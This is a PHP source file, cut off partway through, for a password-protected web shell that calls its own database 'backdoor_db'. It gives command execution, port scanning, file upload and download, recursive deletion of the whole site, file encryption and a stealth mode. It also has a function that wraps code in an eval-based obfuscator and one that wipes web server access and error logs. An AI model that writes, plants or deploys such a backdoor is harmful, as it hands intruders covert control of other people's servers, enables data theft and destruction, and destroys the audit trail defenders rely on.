<?php
session_start();

// Security Configuration
define('ADMIN_USERNAME', 'selimxpro'); // Custom admin username
define('ADMIN_PASSWORD', 'selimxpro'); // Custom admin password
define('CSRF_TOKEN_NAME', 'csrf_token');
define('LOG_FILE', 'admin_actions.log');
define('SESSION_TIMEOUT', 3600); // 1 hour session timeout

// Database Configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'backdoor_db');

// Advanced Features Configuration
define('ENABLE_COMMAND_EXECUTION', true);
define('ENABLE_DATABASE_MANAGEMENT', true);
define('ENABLE_SYSTEM_MONITORING', true);
define('ENABLE_NETWORK_SCANNING', true);
define('ENABLE_FILE_ENCRYPTION', true);
define('ENABLE_STEALTH_MODE', false);
define('ENABLE_IP_WHITELIST', false);
define('ENABLE_2FA', false);
define('ENABLE_SESSION_FINGERPRINTING', true);
define('MAX_LOGIN_ATTEMPTS', 5);
define('LOGIN_LOCKOUT_TIME', 300); // 5 minutes

// Initialize session variables
if (!isset($_SESSION['authenticated'])) {
    $_SESSION['authenticated'] = false;
}
if (!isset($_SESSION['username'])) {
    $_SESSION['username'] = '';
}
if (!isset($_SESSION['login_time'])) {
    $_SESSION['login_time'] = 0;
}
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Authentication check
function requireAuth() {
    // Check if user is authenticated
    if (!$_SESSION['authenticated']) {
        header('Location: ?');
        exit;
    }
    
    // Check session timeout
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > SESSION_TIMEOUT) {
        logSecurityEvent('SESSION_TIMEOUT', 'Session expired due to timeout');
        session_destroy();
        header('Location: ?&timeout=1');
        exit;
    }
    
    // Validate session fingerprint
    if (!validateSessionFingerprint()) {
        logSecurityEvent('SESSION_HIJACK_ATTEMPT', 'Invalid session fingerprint detected');
        session_destroy();
        header('Location: ?&hijack=1');
        exit;
    }
    
    // Update last activity
    $_SESSION['last_activity'] = time();
}

// CSRF Protection
function generateCSRFToken() {
    return $_SESSION['csrf_token'];
}

function validateCSRFToken($token) {
    return isset($token) && hash_equals($_SESSION['csrf_token'], $token);
}

// Input validation and sanitization
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function validatePath($path, $rootPath) {
    $realPath = realpath($path);
    return $realPath && strpos($realPath, $rootPath) === 0;
}

// Logging system
function logAction($action, $details = '') {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $logEntry = "[$timestamp] IP: $ip | Action: $action | Details: $details | User-Agent: $userAgent" . PHP_EOL;
    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
}

// Handle authentication
$auth_message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = sanitizeInput($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Check if IP is locked
    if (isIPLocked($ip)) {
        $auth_message = 'Too many failed login attempts. Please try again later.';
        logSecurityEvent('LOGIN_BLOCKED', "Blocked login attempt from locked IP: $ip");
    } elseif (!isIPWhitelisted($ip)) {
        $auth_message = 'Access denied from this IP address.';
        logSecurityEvent('LOGIN_DENIED', "Access denied from non-whitelisted IP: $ip");
    } else {
        // Check credentials
        if ($username === ADMIN_USERNAME && $password === ADMIN_PASSWORD) {
            $_SESSION['authenticated'] = true;
            $_SESSION['username'] = $username;
            $_SESSION['login_time'] = time();
            $_SESSION['last_activity'] = time();
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
            $_SESSION['fingerprint'] = generateSessionFingerprint();
            
            $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
            logAction('LOGIN_SUCCESS', "User: $username | IP: $ip | User-Agent: $user_agent");
            logSecurityEvent('LOGIN_SUCCESS', "Successful login: $username from $ip");
            recordLoginAttempt($ip, true);
            
            header('Location: ?');
            exit;
        } else {
            $auth_message = 'Invalid username or password!';
            $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
            logAction('LOGIN_FAILED', "Failed attempt | Username: $username | IP: $ip | User-Agent: $user_agent");
            logSecurityEvent('LOGIN_FAILED', "Failed login attempt: $username from $ip");
            recordLoginAttempt($ip, false);
        }
    }
}

if (isset($_GET['logout'])) {
    logAction('LOGOUT', 'User logged out');
    session_destroy();
    header('Location: ?');
    exit;
}

// Site deletion enabled
$site_deletion_enabled = true;

// Handle site deletion
$deletion_message = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_site'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $deletion_message = "Invalid security token!";
    } elseif (isset($_POST['confirm_delete']) && $_POST['confirm_delete'] === 'DELETE_ALL') {
        if (isset($_POST['final_confirm']) && $_POST['final_confirm'] === 'YES_DELETE_EVERYTHING') {
            // Perform site deletion
            $deletion_message = performSiteDeletion();
            logAction('SITE_DELETION', 'Site deletion completed');
        } else {
            $deletion_message = "Final confirmation required!";
        }
    } else {
        $deletion_message = "Please type 'DELETE_ALL' to confirm!";
    }
}

// Handle new advanced features
$feature_message = "";

// File upload handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file_action'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } elseif (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $upload_path = sanitizeInput($_POST['upload_path'] ?? '.');
        if (uploadFile($_FILES['upload_file'], $upload_path)) {
            $feature_message = "File uploaded successfully!";
        } else {
            $feature_message = "File upload failed!";
        }
    } else {
        $feature_message = "No file selected or upload error!";
    }
}

// File search handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_search_action'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $pattern = sanitizeInput($_POST['file_search_pattern'] ?? '');
        $directory = sanitizeInput($_POST['file_search_dir'] ?? '.');
        $search_results = findFilesByContent($pattern, $directory);
        $feature_message = "Found " . count($search_results) . " files matching pattern: $pattern";
    }
}

// Ping handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ping_action'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $host = sanitizeInput($_POST['ping_host'] ?? '');
        $count = (int)($_POST['ping_count'] ?? 4);
        $ping_result = pingHost($host, $count);
        $feature_message = "Ping result for $host:\n" . $ping_result;
    }
}

// Traceroute handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['traceroute_action'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $host = sanitizeInput($_POST['traceroute_host'] ?? '');
        $traceroute_result = tracerouteHost($host);
        $feature_message = "Traceroute result for $host:\n" . $traceroute_result;
    }
}

// Port scan handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['port_scan_action'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $host = sanitizeInput($_POST['scan_host'] ?? '');
        $scan_result = getOpenPorts($host);
        $feature_message = "Port scan result for $host:\n" . $scan_result;
    }
}

// IP Whitelist handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_whitelist'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $ip = sanitizeInput($_POST['whitelist_ip'] ?? '');
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            if (addToWhitelist($ip)) {
                $feature_message = "IP $ip added to whitelist successfully!";
            } else {
                $feature_message = "IP $ip is already in the whitelist!";
            }
        } else {
            $feature_message = "Invalid IP address format!";
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['remove_whitelist'])) {
    requireAuth();
    
    if (!validateCSRFToken($_POST['csrf_token'] ?? '')) {
        $feature_message = "Invalid security token!";
    } else {
        $ip = sanitizeInput($_POST['whitelist_ip'] ?? '');
        if (removeFromWhitelist($ip)) {
            $feature_message = "IP $ip removed from whitelist successfully!";
        } else {
            $feature_message = "IP $ip not found in whitelist!";
        }
    }
}

function performSiteDeletion() {
    $root_path = dirname(__DIR__); // Go up one level from jet directory
    $deleted_files = 0;
    $deleted_dirs = 0;
    
    try {
        // Get all files and directories
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        
        foreach ($iterator as $file) {
            $file_path = $file->getRealPath();
            
            // Skip the current manage.php file and some system files
            if (strpos($file_path, 'manage.php') !== false || 
                strpos($file_path, '.git') !== false ||
                strpos($file_path, 'cgi-bin') !== false) {
                continue;
            }
            
            if ($file->isDir()) {
                if (rmdir($file_path)) {
                    $deleted_dirs++;
                }
            } else {
                if (unlink($file_path)) {
                    $deleted_files++;
                }
            }
        }
        
        // Try to delete the root directory itself
        if (is_dir($root_path)) {
            rmdir($root_path);
        }
        
        return "Site deletion completed! Deleted $deleted_files files and $deleted_dirs directories.";
        
    } catch (Exception $e) {
        return "Error during deletion: " . $e->getMessage();
    }
}

// Get site statistics
function getSiteStats() {
    $root_path = dirname(__DIR__);
    $total_files = 0;
    $total_dirs = 0;
    $total_size = 0;
    
    if (is_dir($root_path)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $total_dirs++;
            } else {
                $total_files++;
                $total_size += $file->getSize();
            }
        }
    }
    
    return [
        'files' => $total_files,
        'directories' => $total_dirs,
        'size' => formatBytes($total_size)
    ];
}

function formatBytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// ==================== ADVANCED FEATURES ====================

// Database Management Functions
function getDatabaseConnection() {
    try {
        $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    } catch (PDOException $e) {
        return false;
    }
}

function executeDatabaseQuery($query, $params = []) {
    $pdo = getDatabaseConnection();
    if (!$pdo) return false;
    
    try {
        $stmt = $pdo->prepare($query);
        $stmt->execute($params);
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        return false;
    }
}

function getDatabaseTables() {
    $query = "SHOW TABLES";
    return executeDatabaseQuery($query);
}

function getTableStructure($table) {
    $query = "DESCRIBE " . $table;
    return executeDatabaseQuery($query);
}

// Command Execution Functions
function executeCommand($command) {
    if (!ENABLE_COMMAND_EXECUTION) return "Command execution is disabled!";
    
    $output = [];
    $return_var = 0;
    
    // Security: Only allow certain commands
    $allowed_commands = ['ls', 'dir', 'pwd', 'whoami', 'ps', 'netstat', 'ifconfig', 'ipconfig', 'df', 'free', 'uptime', 'uname'];
    $cmd_parts = explode(' ', $command);
    $base_cmd = $cmd_parts[0];
    
    if (!in_array($base_cmd, $allowed_commands)) {
        return "Command not allowed: $base_cmd";
    }
    
    exec($command . ' 2>&1', $output, $return_var);
    
    logAction('COMMAND_EXECUTION', "Executed: $command");
    return implode("\n", $output);
}

// System Monitoring Functions
function getSystemInfo() {
    $info = [];
    
    // Basic system info
    $info['os'] = php_uname('s');
    $info['hostname'] = php_uname('n');
    $info['release'] = php_uname('r');
    $info['version'] = php_uname('v');
    $info['machine'] = php_uname('m');
    
    // PHP info
    $info['php_version'] = PHP_VERSION;
    $info['php_sapi'] = php_sapi_name();
    
    // Memory info
    $info['memory_usage'] = formatBytes(memory_get_usage(true));
    $info['memory_peak'] = formatBytes(memory_get_peak_usage(true));
    $info['memory_limit'] = ini_get('memory_limit');
    
    // Disk space
    $info['disk_free'] = formatBytes(disk_free_space('.'));
    $info['disk_total'] = formatBytes(disk_total_space('.'));
    
    // Load average (Unix systems)
    if (function_exists('sys_getloadavg')) {
        $load = sys_getloadavg();
        $info['load_average'] = implode(', ', $load);
    }
    
    return $info;
}

function getProcessList() {
    if (!ENABLE_SYSTEM_MONITORING) return [];
    
    $processes = [];
    $output = [];
    exec('ps aux', $output);
    
    foreach ($output as $line) {
        $parts = preg_split('/\s+/', $line, 11);
        if (count($parts) >= 11) {
            $processes[] = [
                'user' => $parts[0],
                'pid' => $parts[1],
                'cpu' => $parts[2],
                'mem' => $parts[3],
                'vsz' => $parts[4],
                'rss' => $parts[5],
                'tty' => $parts[6],
                'stat' => $parts[7],
                'start' => $parts[8],
                'time' => $parts[9],
                'command' => $parts[10]
            ];
        }
    }
    
    return $processes;
}

// Network Scanning Functions
function scanPorts($host, $ports = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306]) {
    if (!ENABLE_NETWORK_SCANNING) return [];
    
    $results = [];
    foreach ($ports as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
        if (is_resource($connection)) {
            $results[$port] = 'Open';
            fclose($connection);
        } else {
            $results[$port] = 'Closed';
        }
    }
    
    logAction('NETWORK_SCAN', "Scanned $host");
    return $results;
}

function getNetworkInterfaces() {
    $interfaces = [];
    
    if (function_exists('exec')) {
        $output = [];
        exec('ip addr show', $output);
        
        $current_interface = '';
        foreach ($output as $line) {
            if (preg_match('/^\d+:\s+(\w+)/', $line, $matches)) {
                $current_interface = $matches[1];
                $interfaces[$current_interface] = [];
            } elseif (strpos($line, 'inet ') === 0 && $current_interface) {
                preg_match('/inet (\d+\.\d+\.\d+\.\d+)/', $line, $matches);
                if (isset($matches[1])) {
                    $interfaces[$current_interface]['ip'] = $matches[1];
                }
            }
        }
    }
    
    return $interfaces;
}

// File Encryption Functions
function encryptFile($filePath, $password) {
    if (!ENABLE_FILE_ENCRYPTION) return false;
    
    $data = file_get_contents($filePath);
    if ($data === false) return false;
    
    $iv = random_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', hash('sha256', $password), 0, $iv);
    
    if ($encrypted === false) return false;
    
    $result = base64_encode($iv . $encrypted);
    return file_put_contents($filePath . '.enc', $result) !== false;
}

function decryptFile($filePath, $password) {
    if (!ENABLE_FILE_ENCRYPTION) return false;
    
    $data = file_get_contents($filePath);
    if ($data === false) return false;
    
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    
    $decrypted = openssl_decrypt($encrypted, 'AES-256-CBC', hash('sha256', $password), 0, $iv);
    
    if ($decrypted === false) return false;
    
    return file_put_contents(str_replace('.enc', '', $filePath), $decrypted) !== false;
}

// Backup Functions
function createBackup($backupPath = null) {
    if (!$backupPath) {
        $backupPath = 'backup_' . date('Y-m-d_H-i-s') . '.zip';
    }
    
    $rootPath = dirname(__DIR__);
    $zip = new ZipArchive();
    
    if ($zip->open($backupPath, ZipArchive::CREATE) !== TRUE) {
        return false;
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootPath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($rootPath) + 1);
        
        if ($file->isDir()) {
            $zip->addEmptyDir($relativePath);
        } else {
            $zip->addFile($filePath, $relativePath);
        }
    }
    
    $zip->close();
    logAction('BACKUP_CREATED', "Backup created: $backupPath");
    return $backupPath;
}

// Log Analysis Functions
function analyzeLogs($lines = 100) {
    $logFile = LOG_FILE;
    if (!file_exists($logFile)) return [];
    
    $logs = file($logFile, FILE_IGNORE_NEW_LINES);
    $logs = array_slice($logs, -$lines);
    
    $analysis = [
        'total_entries' => count($logs),
        'login_attempts' => 0,
        'failed_logins' => 0,
        'file_operations' => 0,
        'command_executions' => 0,
        'recent_actions' => []
    ];
    
    foreach ($logs as $log) {
        if (strpos($log, 'LOGIN') !== false) {
            $analysis['login_attempts']++;
            if (strpos($log, 'LOGIN_FAILED') !== false) {
                $analysis['failed_logins']++;
            }
        }
        
        if (strpos($log, 'FILE_') !== false) {
            $analysis['file_operations']++;
        }
        
        if (strpos($log, 'COMMAND_EXECUTION') !== false) {
            $analysis['command_executions']++;
        }
        
        $analysis['recent_actions'][] = $log;
    }
    
    return $analysis;
}

// Stealth Mode Functions
function enableStealthMode() {
    if (!ENABLE_STEALTH_MODE) return false;
    
    // Hide from common detection methods
    ini_set('expose_php', 'Off');
    ini_set('display_errors', 'Off');
    ini_set('log_errors', 'On');
    
    // Randomize session name
    session_name('PHPSESSID_' . bin2hex(random_bytes(8)));
    
    return true;
}

// Email Notification Functions
function sendEmailNotification($subject, $message, $to = 'admin@example.com') {
    $headers = "From: backdoor@system.com\r\n";
    $headers .= "Reply-To: backdoor@system.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    return mail($to, $subject, $message, $headers);
}

// User Management Functions
function createUser($username, $password, $role = 'user') {
    $users_file = 'users.json';
    $users = [];
    
    if (file_exists($users_file)) {
        $users = json_decode(file_get_contents($users_file), true) ?: [];
    }
    
    $users[$username] = [
        'password' => password_hash($password, PASSWORD_DEFAULT),
        'role' => $role,
        'created' => date('Y-m-d H:i:s'),
        'last_login' => null,
        'active' => true
    ];
    
    if (file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT))) {
        logAction('USER_CREATED', "Created user: $username");
        return true;
    }
    
    return false;
}

function authenticateUser($username, $password) {
    $users_file = 'users.json';
    if (!file_exists($users_file)) return false;
    
    $users = json_decode(file_get_contents($users_file), true) ?: [];
    
    if (isset($users[$username]) && $users[$username]['active']) {
        if (password_verify($password, $users[$username]['password'])) {
            $users[$username]['last_login'] = date('Y-m-d H:i:s');
            file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT));
            return $users[$username];
        }
    }
    
    return false;
}

function getAllUsers() {
    $users_file = 'users.json';
    if (!file_exists($users_file)) return [];
    
    return json_decode(file_get_contents($users_file), true) ?: [];
}

function updateUserRole($username, $newRole) {
    $users_file = 'users.json';
    $users = getAllUsers();
    
    if (isset($users[$username])) {
        $users[$username]['role'] = $newRole;
        if (file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT))) {
            logAction('USER_ROLE_UPDATED', "Updated role for $username to $newRole");
            return true;
        }
    }
    
    return false;
}

function toggleUserStatus($username) {
    $users_file = 'users.json';
    $users = getAllUsers();
    
    if (isset($users[$username])) {
        $users[$username]['active'] = !$users[$username]['active'];
        if (file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT))) {
            $status = $users[$username]['active'] ? 'activated' : 'deactivated';
            logAction('USER_STATUS_CHANGED', "$status user: $username");
            return true;
        }
    }
    
    return false;
}

// Real-time Monitoring Functions
function getRealTimeStats() {
    return [
        'timestamp' => time(),
        'memory_usage' => memory_get_usage(true),
        'memory_peak' => memory_get_peak_usage(true),
        'disk_free' => disk_free_space('.'),
        'load_average' => function_exists('sys_getloadavg') ? sys_getloadavg() : null,
        'uptime' => function_exists('exec') ? trim(exec('uptime')) : null
    ];
}

// Advanced Security Functions
function obfuscateCode($code) {
    // Simple obfuscation - in production, use more sophisticated methods
    $obfuscated = base64_encode(gzcompress($code));
    return "<?php eval(gzuncompress(base64_decode('$obfuscated'))); ?>";
}

function generateRandomFilename($extension = 'php') {
    return bin2hex(random_bytes(16)) . '.' . $extension;
}

function hideFromLogs() {
    // Clear common log files
    $log_files = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log'
    ];
    
    foreach ($log_files as $log_file) {
        if (file_exists($log_file) && is_writable($log_file)) {
            file_put_contents($log_file, '');
        }
    }
}

// Advanced File Operations
function findFilesByContent($search_term, $directory = '.') {
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && $file->getExtension() === 'php') {
            $content = file_get_contents($file->getRealPath());
            if (strpos($content, $search_term) !== false) {
                $results[] = $file->getRealPath();
            }
        }
    }
    
    return $results;
}

function massFileOperation($operation, $pattern, $directory = '.') {
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && fnmatch($pattern, $file->getFilename())) {
            switch ($operation) {
                case 'delete':
                    if (unlink($file->getRealPath())) {
                        $results[] = "Deleted: " . $file->getRealPath();
                    }
                    break;
                case 'chmod':
                    if (chmod($file->getRealPath(), 0644)) {
                        $results[] = "Changed permissions: " . $file->getRealPath();
                    }
                    break;
            }
        }
    }
    
    return $results;
}

// Enhanced file manager logic with search and filter
function listDirectory($dir, $search = '', $sortBy = 'name', $sortOrder = 'asc') {
    $items = scandir($dir);
    $result = [];
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        // Apply search filter
        if (!empty($search) && stripos($item, $search) === false) {
            continue;
        }
        
        $result[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? filesize($path) : 0,
            'modified' => filemtime($path),
            'permissions' => substr(sprintf('%o', fileperms($path)), -4),
            'extension' => is_file($path) ? strtolower(pathinfo($item, PATHINFO_EXTENSION)) : '',
            'type' => getFileType($path)
        ];
    }
    
    // Apply sorting
    usort($result, function($a, $b) use ($sortBy, $sortOrder) {
        $multiplier = ($sortOrder === 'desc') ? -1 : 1;
        
        switch ($sortBy) {
            case 'name':
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
                return $multiplier * strcasecmp($a['name'], $b['name']);
            case 'size':
                if ($a['is_dir'] && !$b['is_dir']) return -1;
                if (!$a['is_dir'] && $b['is_dir']) return 1;
                return $multiplier * ($a['size'] - $b['size']);
            case 'date':
                if ($a['is_dir'] && !$b['is_dir']) return -1;
                if (!$a['is_dir'] && $b['is_dir']) return 1;
                return $multiplier * ($a['modified'] - $b['modified']);
            default:
                return 0;
        }
    });
    
    return $result;
}

// Get file type for icon display
function getFileType($path) {
    if (is_dir($path)) {
        return 'folder';
    }
    
    $extension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    
    $imageTypes = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp'];
    $codeTypes = ['php', 'js', 'css', 'html', 'htm', 'xml', 'json', 'sql', 'py', 'java', 'cpp', 'c', 'h'];
    $archiveTypes = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
    $documentTypes = ['pdf', 'doc', 'docx', 'txt', 'rtf', 'odt'];
    
    if (in_array($extension, $imageTypes)) return 'image';
    if (in_array($extension, $codeTypes)) return 'code';
    if (in_array($extension, $archiveTypes)) return 'archive';
    if (in_array($extension, $documentTypes)) return 'document';
    
    return 'file';
}

// Get file icon based on type
function getFileIcon($type, $extension = '') {
    $icons = [
        'folder' => '📁',
        'image' => '🖼️',
        'code' => '💻',
        'archive' => '📦',
        'document' => '📄',
        'file' => '📄'
    ];
    
    // Special icons for specific extensions
    $specialIcons = [
        'php' => '🐘',
        'js' => '🟨',
        'css' => '🎨',
        'html' => '🌐',
        'json' => '📋',
        'sql' => '🗄️',
        'py' => '🐍',
        'java' => '☕',
        'pdf' => '📕',
        'zip' => '🗜️',
        'jpg' => '🖼️',
        'png' => '🖼️',
        'gif' => '🎞️'
    ];
    
    if (isset($specialIcons[$extension])) {
        return $specialIcons[$extension];
    }
    
    return $icons[$type] ?? '📄';
}

// Enhanced file upload handling
function handleFileUpload($targetDir, $files = null) {
    if ($files === null) {
        $files = $_FILES['upload_files'] ?? [];
    }
    
    $results = [];
    $uploaded_count = 0;
    $failed_count = 0;
    
    // Handle single file upload
    if (isset($files['name']) && !is_array($files['name'])) {
        $files = [
            'name' => [$files['name']],
            'tmp_name' => [$files['tmp_name']],
            'error' => [$files['error']],
            'size' => [$files['size']]
        ];
    }
    
    // Handle multiple file uploads
    if (isset($files['name']) && is_array($files['name'])) {
        for ($i = 0; $i < count($files['name']); $i++) {
            if ($files['error'][$i] === UPLOAD_ERR_OK) {
                $fileName = sanitizeInput($files['name'][$i]);
    $targetFile = $targetDir . DIRECTORY_SEPARATOR . $fileName;
    
                // Check if file already exists and rename if necessary
                $counter = 1;
                $originalName = pathinfo($fileName, PATHINFO_FILENAME);
                $extension = pathinfo($fileName, PATHINFO_EXTENSION);
                
                while (file_exists($targetFile)) {
                    $fileName = $originalName . '_' . $counter . '.' . $extension;
                    $targetFile = $targetDir . DIRECTORY_SEPARATOR . $fileName;
                    $counter++;
                }
                
                if (move_uploaded_file($files['tmp_name'][$i], $targetFile)) {
                    $uploaded_count++;
        logAction('FILE_UPLOAD', "Uploaded: $fileName");
                } else {
                    $failed_count++;
                    $results[] = "Failed to upload: " . $files['name'][$i];
                }
            } else {
                $failed_count++;
                $results[] = "Upload error for: " . $files['name'][$i];
            }
        }
    }
    
    $message = "Upload completed: $uploaded_count successful, $failed_count failed";
    if (!empty($results)) {
        $message .= "\nDetails: " . implode("\n", $results);
    }
    
    return $message;
}

// File download function
function downloadFile($filePath) {
    if (!file_exists($filePath) || !is_file($filePath)) {
        return false;
    }
    
    $fileName = basename($filePath);
    $fileSize = filesize($filePath);
    
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $fileName . '"');
    header('Content-Length: ' . $fileSize);
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    
    readfile($filePath);
    logAction('FILE_DOWNLOAD', "Downloaded: $fileName");
    return true;
}

// Create ZIP download
function createZipDownload($files, $zipName = 'download.zip') {
    $zip = new ZipArchive();
    $tempZip = tempnam(sys_get_temp_dir(), 'backdoor_zip_');
    
    if ($zip->open($tempZip, ZipArchive::CREATE) !== TRUE) {
        return false;
    }
    
    foreach ($files as $file) {
        if (file_exists($file) && is_file($file)) {
            $zip->addFile($file, basename($file));
        }
    }
    
    $zip->close();
    
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $zipName . '"');
    header('Content-Length: ' . filesize($tempZip));
    
    readfile($tempZip);
    unlink($tempZip);
    
    logAction('ZIP_DOWNLOAD', "Created ZIP: $zipName with " . count($files) . " files");
    return true;
}

// Rename file/folder function
function renameItem($oldPath, $newName) {
    if (!file_exists($oldPath)) {
        return 'Item not found!';
    }
    
    $dir = dirname($oldPath);
    $newPath = $dir . DIRECTORY_SEPARATOR . sanitizeInput($newName);
    
    if (file_exists($newPath)) {
        return 'A file/folder with this name already exists!';
    }
    
    if (rename($oldPath, $newPath)) {
        $itemType = is_dir($oldPath) ? 'folder' : 'file';
        logAction('ITEM_RENAME', "Renamed $itemType: " . basename($oldPath) . " to $newName");
        return ucfirst($itemType) . ' renamed successfully!';
    }
    
    return 'Rename failed!';
}

// Move file/folder function
function moveItem($sourcePath, $destinationPath) {
    if (!file_exists($sourcePath)) {
        return 'Source item not found!';
    }
    
    if (!is_dir($destinationPath)) {
        return 'Destination directory not found!';
    }
    
    $fileName = basename($sourcePath);
    $newPath = $destinationPath . DIRECTORY_SEPARATOR . $fileName;
    
    if (file_exists($newPath)) {
        return 'A file/folder with this name already exists in the destination!';
    }
    
    if (rename($sourcePath, $newPath)) {
        $itemType = is_dir($sourcePath) ? 'folder' : 'file';
        logAction('ITEM_MOVE', "Moved $itemType: $fileName to " . $destinationPath);
        return ucfirst($itemType) . ' moved successfully!';
    }
    
    return 'Move failed!';
}

// Delete multiple files function
function deleteMultipleItems($filePaths) {
    $deleted_count = 0;
    $failed_count = 0;
    $results = [];
    
    foreach ($filePaths as $filePath) {
        if (file_exists($filePath)) {
            if (is_dir($filePath)) {
                if (rmdir($filePath)) {
                    $deleted_count++;
                    logAction('FOLDER_DELETE', "Deleted folder: " . basename($filePath));
                } else {
                    $failed_count++;
                    $results[] = "Failed to delete folder: " . basename($filePath);
                }
            } else {
                if (unlink($filePath)) {
                    $deleted_count++;
                    logAction('FILE_DELETE', "Deleted file: " . basename($filePath));
                } else {
                    $failed_count++;
                    $results[] = "Failed to delete file: " . basename($filePath);
                }
            }
        } else {
            $failed_count++;
            $results[] = "Item not found: " . basename($filePath);
        }
    }
    
    $message = "Bulk delete completed: $deleted_count successful, $failed_count failed";
    if (!empty($results)) {
        $message .= "\nDetails: " . implode("\n", $results);
    }
    
    return $message;
}

// Create new file/folder
function createNewItem($path, $name, $isDir = false) {
    $fullPath = $path . DIRECTORY_SEPARATOR . sanitizeInput($name);
    
    if (file_exists($fullPath)) {
        return 'Item already exists!';
    }
    
    if ($isDir) {
        if (mkdir($fullPath, 0755, true)) {
            logAction('FOLDER_CREATE', "Created folder: $name");
            return 'Folder created successfully!';
        }
    } else {
        if (file_put_contents($fullPath, '') !== false) {
